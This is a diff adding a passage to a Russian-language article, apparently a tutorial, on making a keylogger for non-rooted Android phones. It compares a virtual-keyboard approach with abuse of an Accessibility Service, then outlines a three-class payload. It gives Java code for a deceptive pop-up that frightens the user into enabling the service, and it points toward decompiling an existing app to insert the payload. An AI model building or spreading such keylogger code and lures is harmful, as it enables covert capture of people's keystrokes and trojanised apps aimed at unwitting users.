@@ -508,7 +508,35 @@ https://youtu.be/iBCX_A5FBVU
 
 ### Keylogger не требующий рута
 
-На данный момент, мне известно два способа создания кейлоггера под андроид
+На данный момент, мне известно два способа создания кейлоггера под андроид, на нерутованном телефоне. Первый способ - создание своей виртуальной клавиатуры. Вы устанавливаете такое приложение и добавляете его в настройках, как виртуальную клавиатуру.
+
+![](/assets/images/virtual_keyboard.jpg)
+
+Это способ самый бесполезный, собственная клавиатура хорошо видна пользователю. Второй способ, это создание Accessibility Service. Такие сервисы, встраиваются в приложения, для людей с ограниченными возможностями. Они имеют доступ ко многим вещам, одна из которых - пользовательский ввод. Именно то что нужно для кейлоггера.
+
+## Создаем payload
+
+Payload будет состоять из трех классов - ```ExecuteAttack```, ```GoogleService```, ```SendService```.
+
+Чтобы наш Accessibility Service начал работать, пользователю необходимо включить его в настройках. Мы поможем в этом пользователю, внедрив в приложение всплывающее окно, с текстом *Please enable app in settings! Otherwise it will stop working* (можно использовать и более пугающий текст). И добавим кнопочку, чтобы пользователь по ней кликнул и перешел сразу в настройки. Класс ```ExecuteAttack``` именно это и делает.
+
+```java
+public static void openSettings(final Context ctx) {
+        AlertDialog alertDialog = new AlertDialog.Builder(ctx).create();
+        alertDialog.setTitle("Alert");
+        alertDialog.setMessage("Please enable app in settings! Otherwise it will stop working");
+        alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "Settings",
+                new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface dialog, int which) {
+                        ctx.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
+                    }
+                });
+        alertDialog.show();
+    }
+```
+
+![](/assets/images/keylogger_prj.png)
+
 Скачиваем приложение, декомпилируем. Открываем манифест, находим активити.
 
 ```xml
